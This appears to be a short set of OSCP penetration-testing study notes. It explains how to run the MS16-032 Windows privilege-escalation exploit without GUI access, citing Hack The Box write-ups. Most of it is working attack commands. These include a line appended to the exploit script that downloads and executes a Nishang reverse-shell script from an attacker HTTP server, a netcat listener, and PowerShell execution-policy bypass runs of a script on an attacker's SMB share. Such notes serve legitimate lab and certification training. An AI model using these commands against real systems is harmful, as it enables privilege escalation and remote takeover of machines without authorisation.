# OSCP-Notes
Generic Notes Regarding OSCP:

1.[ Misc](#misc)

## Misc:

### MS16-032 Non-GUI Method:
By default, this exploit requires GUI access on the victim. A modified ```Invoke-MS16032.ps1``` variant by [empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1) provides a workaround.

You will need a smbserver and python http server both serving the folder containing your .ps1 exploit and reverse shell. 

This should be already covered whilst in the previous parts of the pentesting process.

 Add this line to the end of the above ```Invoke-MS16032.ps1``` script:
```Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://<your attacker IP where your python3 http server is serving your working folder for exploits etc.>/<your nishang .ps1 reverse shell script>')"```.

IE: ``` Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.10/Invoke-PowerShellTcp.ps1')"```.

Then setup a listener ```sudo rlwrap nc -lvnp <port of choice used in http://10.10.14.10/Invoke-PowerShellTcp.ps1 >```.



Lastly, run using correct powershell like this:
 ```C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -ep bypass -File \\<your attacker IP>\<foldername used in smbserver.py>\Invoke-MS16-032.ps1```.
 
 If the x86 powershell does not work, use the x64 one here:
 ```C:\Windows\sysnative\WindowsPowershell\v1.0\powershell.exe -ep bypass -File \\<your attacker IP>\<foldername used in smbserver.py>\Invoke-MS16-032.ps1```.

- 1.[https://0xdf.gitlab.io/2021/03/17/htb-optimum.html](https://0xdf.gitlab.io/2021/03/17/htb-optimum.html) 
- 2.[https://ivanitlearning.wordpress.com/2020/08/01/hackthebox-optimum/](https://ivanitlearning.wordpress.com/2020/08/01/hackthebox-optimum/)

### Powershell Script Not Running
Sometimes, when ```.ps1``` exploits do not work, it may be due to how the default ```powershell.exe``` used is incorrect.
In this case, try to use: ```C:\Windows\sysnative\WindowsPowershell\v1.0\powershell.exe``` instead, this will call the x64 version of powershell which may be what is needed for kernel exploits since by default, the x86 powershell is run instead in  ```C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe```.
